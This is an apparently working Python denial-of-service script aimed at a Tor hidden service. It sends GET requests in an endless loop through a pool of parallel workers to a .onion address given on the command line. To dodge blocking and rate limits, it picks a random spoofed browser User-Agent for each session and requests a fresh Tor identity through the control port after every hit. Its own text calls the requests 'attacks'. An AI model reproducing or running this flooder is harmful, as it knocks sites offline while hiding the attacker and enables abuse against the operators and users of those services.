import time
import argparse
import subprocess
import requests
import random
import string
import multiprocessing
from stem.control import Controller
from random import choice



global_user_agent = "sent"
global_response = 200

# Connect to the Tor control port
with Controller.from_port(port=9051) as controller:
    controller.authenticate()  # Replace with your control port password
    print("Tor is running version:", controller.get_version())

# Set up the argument parser
parser = argparse.ArgumentParser(description="Pass key-value pairs.")

# Add arguments for name and age
parser.add_argument('--name', type=str, help="The name of the onion")
parser.add_argument('--number', type=int, help="The number attacks")
parser.add_argument('--threads', type=int, help="The number attacks")

# Parse the arguments
args = parser.parse_args()

# args.name
# args.number
# args.threads

def generate_random_string(length=random.randint(50, 1000)):
    # Choose from uppercase, lowercase letters
    characters = string.ascii_letters
    return ''.join(random.choices(characters, k=length))

random_string = generate_random_string()
random_number = random.randint(10000000, 5000000000)

#headers = {
 #           "Content-Type": "application/json",  # Ensure proper content type
  #          "User-Agent": "MyCustomUserAgent",   # Some sites may check for a User-Agent
   #     }


def get_tor_session():

    global global_user_agent
    """Creates a new Tor session."""
    session = requests.Session()

    # Configure the session to use Tor's SOCKS5 proxy
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',  # Default Tor SOCKS proxy for HTTP
        'https': 'socks5h://127.0.0.1:9050',  # Default Tor SOCKS proxy for HTTPS
    }
    user_agent = pick_user_agent()
    session.headers.update({'User-Agent': user_agent})
    global_user_agent = user_agent
    return session


def pick_user_agent():
        USER_AGENTS = [
            'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
            'Mozilla/5.0 (Windows NT 6.1; rv:50.0) Gecko/20100101 Firefox/50.0',
            'Mozilla/5.0 (Windows NT 6.1; rv:51.0) Gecko/20100101 Firefox/51.0',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
            'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
            'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0',
            'Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0',
            'Mozilla/5.0 (X11; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0',
            'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0',
            'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
            'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0',
            'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
            'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0',
            'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0;  Trident/5.0)',
            'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)',
            'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:51.0) Gecko/20100101 Firefox/51.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:50.0) Gecko/20100101 Firefox/50.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:50.0) Gecko/20100101 Firefox/50.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:50.0) Gecko/20100101 Firefox/50.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Gecko/20100101 Firefox/51.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:51.0) Gecko/20100101 Firefox/51.0',
            'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.100 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/601.7.8 (KHTML, like Gecko) Version/9.1.3 Safari/537.86.7',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.4.8 (KHTML, like Gecko) Version/10.0.3 Safari/602.4.8',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/602.4.8 (KHTML, like Gecko) Version/10.0.3 Safari/602.4.8',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/602.4.8 (KHTML, like Gecko) Version/10.0.3 Safari/602.4.8',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0.2 Safari/602.3.12',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0.2 Safari/602.3.12',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0.2 Safari/602.3.12',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586',
            'Mozilla/5.0 (iPad; CPU OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0 \'Mobile/14C92 Safari/602.1',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, lik0e Gecko) Ubuntu Chromium/55.0.2883.87 Chrome/55.0.2883.87 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/53.0.2785.143 Chrome/53.0.2785.143 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0 \'Mobile/14C92 Safari/602.1'
        ]
        return choice(USER_AGENTS)





def get_public_ip_via_tor():
    global global_response
    # Use Tor's SOCKS proxy
    proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050',
    }

    # Create a new Tor session
    session = get_tor_session()

    # Access a .onion website
    onion_url = args.name  # Replace with the .onion website
    try:
        #print("Accessing .onion site...")
        response = session.get(onion_url)
        global_response = response.status_code
        #print("Response status:", response.status_code)
        #print("Content:", response.text[:50])  # Print the first 500 characters of the response
    except requests.exceptions.RequestException as e:
        print("Error accessing .onion site:", e)

    # Renew the Tor connection
    renew_connection()
    #time.sleep(2)

    '''try:
        # Fetch public IP using Tor
        response = requests.get("https://api.ipify.org", proxies=proxies, timeout=10)
        print(f"Public IP via Tor: {response.text}")
    except requests.RequestException as e:
        print(f"Error fetching public IP via Tor: {e}")'''



    '''# Access the .onion website again after renewing the connection
    try:
        print("Accessing .onion site after renewing connection...")
        response = session.get(onion_url, timeout=10)
        print("Response status:", response.status_code)
        print("Content:", response.text[:500])  # Print the first 500 characters of the response
    except requests.exceptions.RequestException as e:
        print("Error accessing .onion site:", e)


    try:
        # Fetch public IP using Tor
     response = requests.get("https://api.ipify.org", proxies=proxies, timeout=10)
     print(f"Public IP via Tor: {response.text}")
    except requests.RequestException as e:
     print(f"Error fetching public IP via Tor: {e}")'''

    #onion_url = "http://exampleonion.onion"
    #time.sleep(1)

    '''try:
        #payload = {"random_number": "random_string"}  # Replace with your actual data
    
        # Send a GET request to the .onion site
        response = requests.get(args.name, proxies=proxies, timeout=10)
        #response = requests.post(args.name, proxies=proxies, data={"random_number": "random_string"}, timeout=10)
        #response = requests.put(args.name, proxies=proxies, json=payload, headers=headers, timeout=30)
        if response.status_code == 200:
            print("Get attack successful")
        else:
            print("Failed")
           
        
        
    except requests.RequestException as e:
        print(f"Error connecting to {args.name}: {e}")'''





'''def manage_tor_service():
    for i in range(args.number):  # Repeat 10 times

        try:

            # Start the Tor service

            #-subprocess.run(["sudo", "systemctl", "start", "tor"], check=True)
            #print("Tor service started.")
            # Wait for 5 seconds
            #time.sleep(1)

            # Fetch the external/public IP address using a service

            

            #counter = 0
            #while counter < 5:
            get_public_ip_via_tor() 

            #    time.sleep(0.5)
            #    counter += 1
            #if counter == 5:

            # Stop the Tor service

            #-subprocess.run(["sudo", "systemctl", "stop", "tor"], check=True)
            #print("Tor service stopped.")
            #time.sleep(1)
                
            #counter = 0  # Reset to 0

           

            
 
            print(f"sent - {i+1}")


            
            
            

        except subprocess.CalledProcessError as e:
            print(f"Error while managing Tor service: {e}")
        except Exception as e:
            print(f"An unexpected error occurred: {e}")'''




def task(identifier, counter, lock, total_tasks):
    """Simulate a task that takes time and updates a shared counter."""
    with lock:
        counter.value += 1
        #print(f"{global_response} -number  {counter.value}")
        print(f"{global_response} - {identifier} -{global_user_agent}: {counter.value}")
    #manage_tor_service() # Simulating work
    get_public_ip_via_tor()
    #print(f"Task {identifier} completed.")

def renew_connection():
    """Request a new Tor identity using the Tor ControlPort."""
    with Controller.from_port(port=9051) as controller:
        controller.authenticate()  # Replace with your password
        controller.signal('NEWNYM')  # Request a new identity
        #print("New Tor identity requested.")
        
        
    

    
     
        
        

 


if __name__ == "__main__":
    num_tasks = args.number  # Total number of tasks
    num_workers = args.threads  # Number of processes to run in parallel

         # Infinite while loop for tasks
    
        # Use Manager to create shared counter and lock
    with multiprocessing.Manager() as manager:
        counter = manager.Value('i', 0)  # Shared integer initialized to 0
        lock = manager.Lock()

        while True:

            # Number of tasks to process in one iteration (optional)
            tasks_per_iteration = args.threads

            # Create a pool of workers
            with multiprocessing.Pool(processes=num_workers) as pool:
            # Generate tasks in this iteration
                pool.starmap(
                task,
                [(i, counter, lock, tasks_per_iteration) for i in range(tasks_per_iteration)]
                )

        #print("Iteration complete. Restarting...")

    

    '''# Use Manager to create shared counter and lock
    with multiprocessing.Manager() as manager:
        counter = manager.Value('i', 0)  # Shared integer initialized to 0
        lock = manager.Lock()

        # Create a pool of workers
        with multiprocessing.Pool(processes=num_workers) as pool:
            # Use starmap to pass multiple arguments to the task
            total_tasks = num_tasks
            pool.starmap(
                task,
                [(i, counter, lock, total_tasks) for i in range(num_tasks)]
            )'''